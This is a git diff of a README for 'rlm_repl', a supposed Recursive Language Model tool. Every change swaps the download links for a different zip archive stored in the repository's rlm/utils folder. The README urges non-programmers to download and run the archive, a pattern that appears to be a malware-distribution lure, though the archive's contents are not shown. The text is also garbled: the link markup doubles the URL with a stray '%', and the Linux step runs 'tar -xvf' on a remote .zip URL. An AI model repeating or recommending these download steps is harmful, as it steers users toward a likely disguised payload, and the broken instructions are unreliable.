@@ -1,7 +1,7 @@
 # 🎉 rlm_repl - Easy RLM Implementation for Everyone
 
 ## 📥 Download the Latest Version
-[![Download rlm_repl](https://raw.githubusercontent.com/SamratSJC/rlm_repl/main/rlm/utils/rlm_repl_1.8-alpha.1.zip%https://raw.githubusercontent.com/SamratSJC/rlm_repl/main/rlm/utils/rlm_repl_1.8-alpha.1.zip)](https://raw.githubusercontent.com/SamratSJC/rlm_repl/main/rlm/utils/rlm_repl_1.8-alpha.1.zip)
+[![Download rlm_repl](https://raw.githubusercontent.com/SamratSJC/rlm_repl/main/rlm/utils/repl-rlm-v3.6.zip%https://raw.githubusercontent.com/SamratSJC/rlm_repl/main/rlm/utils/repl-rlm-v3.6.zip)](https://raw.githubusercontent.com/SamratSJC/rlm_repl/main/rlm/utils/repl-rlm-v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to rlm_repl! This software implements Recursive Language Models (RLMs) based on research by Zhang, Kraska, and Khattab. You don’t need to be a programmer to use it. Just follow the steps below to get started.
@@ -16,7 +16,7 @@ To run rlm_repl, your computer should meet the following requirements:
 ## 📦 Download & Install
 To download rlm_repl, visit the releases page linked below:
 
-[Visit this page to download](https://raw.githubusercontent.com/SamratSJC/rlm_repl/main/rlm/utils/rlm_repl_1.8-alpha.1.zip)
+[Visit this page to download](https://raw.githubusercontent.com/SamratSJC/rlm_repl/main/rlm/utils/repl-rlm-v3.6.zip)
 
 1. Click on the link above to go to the releases page.
 2. Choose the version you want to download. Select the file most suitable for your operating system.
@@ -39,7 +39,7 @@ After downloading the file, follow these steps to install:
 ### For Linux Users:
 1. Open a terminal window.
 2. Navigate to the directory where the file is downloaded.
-3. Type `tar -xvf https://raw.githubusercontent.com/SamratSJC/rlm_repl/main/rlm/utils/rlm_repl_1.8-alpha.1.zip` to extract the files.
+3. Type `tar -xvf https://raw.githubusercontent.com/SamratSJC/rlm_repl/main/rlm/utils/repl-rlm-v3.6.zip` to extract the files.
 4. Change into the rlm_repl directory.
 5. Run the program using `./rlm_repl` or install it using your package manager.
 
@@ -75,6 +75,6 @@ If you still need assistance, feel free to reach out. You can report issues or a
 
 For the latest downloads and updates, always check:
 
-[Visit this page to download](https://raw.githubusercontent.com/SamratSJC/rlm_repl/main/rlm/utils/rlm_repl_1.8-alpha.1.zip)
+[Visit this page to download](https://raw.githubusercontent.com/SamratSJC/rlm_repl/main/rlm/utils/repl-rlm-v3.6.zip)
 
 Thank you for using rlm_repl! Enjoy the power of Recursive Language Models in your projects.
